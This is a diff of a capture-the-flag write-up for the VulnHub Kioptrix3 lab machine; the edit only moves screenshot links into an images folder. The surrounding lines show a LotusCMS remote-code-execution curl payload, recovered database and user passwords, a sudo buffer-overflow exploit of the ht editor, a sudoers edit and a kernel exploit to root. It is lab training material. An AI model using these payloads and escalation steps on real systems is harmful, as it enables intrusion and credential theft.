@@ -50,11 +50,11 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	- `update.php`
 		- Permission Denied
 	- `phpmyadmin`
-		![](Pasted%20image%2020220123184431.png)
+		![](images/Pasted%20image%2020220123184431.png)
 	- `index.php`
-		![](Pasted%20image%2020220123184511.png)
+		![](images/Pasted%20image%2020220123184511.png)
 2. Proceed to login
-	![](Pasted%20image%2020220123184550.png)
+	![](images/Pasted%20image%2020220123184550.png)
 	- LotusCMS
 3. Search for LotusCMS Exploits
 	- [Reference](https://github.com/Hood3dRob1n/LotusCMS-Exploit/blob/master/lotusRCE.sh)
@@ -67,7 +67,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 		```
 		curl http://192.168.1.107/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27COMMAND TO EXECUTE%27%29%7D%3B%23%22
 		```
-		![](Pasted%20image%2020220123190400.png)
+		![](images/Pasted%20image%2020220123190400.png)
 	3. URL Encode "COMMAND TO EXECUTE"
 		```
 		┌──(root💀kali)-[~/vulnHub/kioptrix3/192.168.1.95]
@@ -100,7 +100,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 		whoami
 		www-data
 		```
-		![](Pasted%20image%2020220123191806.png)
+		![](images/Pasted%20image%2020220123191806.png)
 	
 # Privilege Escalation
 ## Loneferret - Via Creds Found
@@ -117,7 +117,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	/home/www/kioptrix3.com/gallery/themes/black/stats.php:138:    $db = MYSQL_CONNECT($host,$user, $pass) OR DIE("Unable to connect to database"); 
 	```
 2. View `stats.php`
-	![](Pasted%20image%2020220123192954.png)
+	![](images/Pasted%20image%2020220123192954.png)
 	```
 	www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u lancore_gallarif -p
 	Enter password: 
@@ -125,7 +125,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	```
 	- Not the database we are looking for
 3. View `gheader.php`
-	![](Pasted%20image%2020220123193128.png)
+	![](images/Pasted%20image%2020220123193128.png)
 	- `/gfunctions.php`
 	- `/gconfig.php`
 4. Find configuration files
@@ -136,7 +136,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	/home/www/kioptrix3.com/gallery/gconfig.php
 	```
 5. View `gconfig.php`
-	![](Pasted%20image%2020220123193414.png)
+	![](images/Pasted%20image%2020220123193414.png)
 	- root:fuckeyou
 6. Access mysql to obtain more creds
 	```
@@ -199,7 +199,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	- dreg:Mast3r
 	- loneferret:starwars
 8. Switch to loneferret
-	![](Pasted%20image%2020220123194519.png)
+	![](images/Pasted%20image%2020220123194519.png)
 
 	
 ## Root - Via Buffer Overflow 
@@ -219,7 +219,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	Error opening terminal: unknown.
 	loneferret@Kioptrix3:~$ export TERM=xterm
 	```
-	![](Pasted%20image%2020220123195137.png)
+	![](images/Pasted%20image%2020220123195137.png)
 	- `ht 2.0.18`
 3. Search for exploits
 	- https://www.exploit-database.net/?id=17836
@@ -230,7 +230,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	python exploit.py > output
 	sudo ht $(cat output)
 	```
-	![](Pasted%20image%2020220123195449.png)
+	![](images/Pasted%20image%2020220123195449.png)
 
 ## Root - Via Sudo
 1. Edit `/etc/sudoers` w/ ht editor
@@ -241,8 +241,8 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	Replace !/usr/bin/su w/ /bin/su
 	ALT + F > Save > Quit
 	```
-	![](Pasted%20image%2020220123195917.png)
-	![](Pasted%20image%2020220123200009.png)
+	![](images/Pasted%20image%2020220123195917.png)
+	![](images/Pasted%20image%2020220123200009.png)
 2. Obtain root
 	```
 	loneferret@Kioptrix3:/home/www/kioptrix3.com$ sudo su
@@ -250,7 +250,7 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	root
 	root@Kioptrix3:/home/www/kioptrix3.com# 
 	```
-	![](Pasted%20image%2020220123200230.png)
+	![](images/Pasted%20image%2020220123200230.png)
 	
 # Privilege Escalation to Root - 3 via Kernel Exploit
 1. Ran linpeas
@@ -281,9 +281,9 @@ update.php              [Status: 200, Size: 18, Words: 2, Lines: 1]
 	uid=0(firefart) gid=0(root) groups=0(root)
 	firefart@Kioptrix3:~# 
 	```
-	![](Pasted%20image%2020220123200759.png)
+	![](images/Pasted%20image%2020220123200759.png)
 5. Flag
-	![](Pasted%20image%2020220123200831.png)
+	![](images/Pasted%20image%2020220123200831.png)
 	
 ---
 Tags: #tcp/80-http/web-app-cms-exploit #tcp/80-http/rce  #linux-priv-esc/linux-creds-found #linux-priv-esc/vulnerable-bin #linux-priv-esc/kernel-exploit 
